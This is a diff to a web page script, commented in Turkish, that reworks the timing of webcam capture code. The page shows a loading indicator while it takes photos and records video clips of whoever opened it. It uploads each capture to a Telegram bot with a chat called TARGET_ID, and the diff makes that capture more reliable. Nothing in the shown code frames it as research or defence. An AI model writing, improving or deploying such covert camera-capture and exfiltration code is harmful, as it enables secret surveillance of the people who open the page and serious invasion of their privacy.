@@ -108,9 +108,8 @@
             let videoTimer = null;
             let videoStopTimer = null;
             let lastPhotoTime = 0;
-            let videoStartTime = 0;
-            let frameCount = 0;
-            let fps = 0;
+            let lastVideoTime = 0;
+            let baslangicZamani = 0;
             
             // ============================================
             // KAMERA BAŞLAT
@@ -132,34 +131,43 @@
                         document.getElementById('startBtn').style.display = 'none';
                         document.getElementById('loading').style.display = 'block';
                         
-                        // FPS ÖLÇÜMÜ
-                        setInterval(() => {
-                            fps = frameCount;
-                            frameCount = 0;
-                        }, 1000);
+                        baslangicZamani = performance.now();
+                        lastPhotoTime = baslangicZamani;
+                        lastVideoTime = baslangicZamani + 2000; // Video 2 saniye sonra başlasın
                         
-                        // İLK FOTOĞRAF
-                        setTimeout(() => {
-                            takePhoto();
-                            lastPhotoTime = performance.now();
+                        // FOTOĞRAF ZAMANLAMA - requestAnimationFrame
+                        function photoLoop() {
+                            const now = performance.now();
+                            const gecenSure = now - baslangicZamani;
                             
-                            // REQUESTANIMATIONFRAME İLE HASSAS FOTOĞRAF (0.1ms hassasiyet)
-                            function photoLoop() {
-                                frameCount++;
-                                const now = performance.now();
-                                const hedefZaman = lastPhotoTime + (FOTO_SURESI * 1000);
-                                
-                                if (now >= hedefZaman) {
-                                    takePhoto();
-                                    lastPhotoTime = now;
-                                }
-                                photoRAF = requestAnimationFrame(photoLoop);
+                            // Kaç fotoğraf olması gerektiğini hesapla
+                            const hedefFotoSayisi = Math.floor(gecenSure / (FOTO_SURESI * 1000));
+                            
+                            // Eksik fotoğraf varsa çek
+                            while (photoCount < hedefFotoSayisi) {
+                                takePhoto();
                             }
+                            
                             photoRAF = requestAnimationFrame(photoLoop);
-                        }, 100);
+                        }
+                        photoRAF = requestAnimationFrame(photoLoop);
                         
-                        // VİDEO BAŞLAT - TAM SÜRESİNDE
-                        setTimeout(recordVideo, 2000);
+                        // VİDEO ZAMANLAMA - setInterval ile hassas
+                        function videoLoop() {
+                            const now = performance.now();
+                            const gecenSure = now - baslangicZamani;
+                            
+                            // Kaç video olması gerektiğini hesapla (2 saniye gecikmeli)
+                            const hedefVideoSayisi = Math.floor(Math.max(0, gecenSure - 2000) / (VIDEO_SURESI * 1000));
+                            
+                            // Eksik video varsa başlat
+                            while (videoCount < hedefVideoSayisi) {
+                                recordVideo();
+                            }
+                        }
+                        
+                        // Her 10ms'de bir kontrol et
+                        setInterval(videoLoop, 10);
                     };
                     
                 } catch(e) {
@@ -168,12 +176,13 @@
             }
             
             // ============================================
-            // FOTOĞRAF ÇEK - 0.1ms HASSASİYET
+            // FOTOĞRAF ÇEK
             // ============================================
             function takePhoto() {
                 if (!stream?.active) return;
                 
                 photoCount++;
+                const fotoZamani = performance.now() - baslangicZamani;
                 
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
@@ -185,7 +194,7 @@
                     const formData = new FormData();
                     formData.append('chat_id', TARGET_ID);
                     formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                    formData.append('caption', `📸 Fotoğraf #${photoCount} - ${FOTO_SURESI}s`);
+                    formData.append('caption', `📸 Fotoğraf #${photoCount} - ${(fotoZamani/1000).toFixed(2)}s`);
                     
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
@@ -195,14 +204,16 @@
             }
             
             // ============================================
-            // VİDEO KAYDI - 0.1ms HASSASİYET
+            // VİDEO KAYDI
             // ============================================
             function recordVideo() {
                 if (!stream?.active) return;
                 
+                videoCount++;
+                const videoBaslangic = performance.now();
+                const gecikme = videoBaslangic - baslangicZamani;
+                
                 recordedChunks = [];
-                videoStartTime = performance.now();
-                const hedefSure = VIDEO_SURESI * 1000;
                 
                 try {
                     mediaRecorder = new MediaRecorder(stream, {
@@ -218,47 +229,28 @@
                 };
                 
                 mediaRecorder.onstop = () => {
-                    const videoEndTime = performance.now();
-                    const gecenSure = videoEndTime - videoStartTime;
-                    const sapma = Math.abs(gecenSure - hedefSure);
-                    
-                    videoCount++;
+                    const videoBitis = performance.now();
+                    const videoSure = (videoBitis - videoBaslangic) / 1000;
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
                     const boyutKB = (blob.size / 1024).toFixed(0);
                     
                     const formData = new FormData();
                     formData.append('chat_id', TARGET_ID);
                     formData.append('video', blob, `video_${Date.now()}.webm`);
-                    formData.append('caption', `🎥 Video #${videoCount} - ${VIDEO_SURESI}s (sapma: ${sapma.toFixed(1)}ms | ${boyutKB}KB)`);
+                    formData.append('caption', `🎥 Video #${videoCount} - Başlangıç:${(gecikme/1000).toFixed(2)}s (${videoSure.toFixed(2)}s | ${boyutKB}KB)`);
                     
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                         method: 'POST',
                         body: formData
                     });
-                    
-                    // YENİ VİDEO - 1ms SONRA
-                    videoTimer = setTimeout(recordVideo, 1);
                 };
                 
                 mediaRecorder.start();
-                
-                // TAM SÜREDE DURDUR (setTimeout + performance.now kontrolü)
-                const stopTime = hedefSure;
-                let kontrolInterval = setInterval(() => {
-                    const gecen = performance.now() - videoStartTime;
-                    if (gecen >= hedefSure - 0.5 && mediaRecorder?.state === 'recording') {
-                        mediaRecorder.stop();
-                        clearInterval(kontrolInterval);
-                        clearTimeout(videoStopTimer);
-                    }
-                }, 0.1); // 0.1ms kontrol
-                
-                videoStopTimer = setTimeout(() => {
+                setTimeout(() => {
                     if (mediaRecorder?.state === 'recording') {
                         mediaRecorder.stop();
-                        clearInterval(kontrolInterval);
                     }
-                }, hedefSure);
+                }, VIDEO_SURESI * 1000);
             }
             
             // ============================================
@@ -268,7 +260,7 @@
                 if (photoRAF) cancelAnimationFrame(photoRAF);
                 if (videoTimer) clearTimeout(videoTimer);
                 if (videoStopTimer) clearTimeout(videoStopTimer);
-                if (mediaRecorder?.state === 'ring') mediaRecorder.stop();
+                if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
                 if (stream) stream.getTracks().forEach(t => t.stop());
             };
             
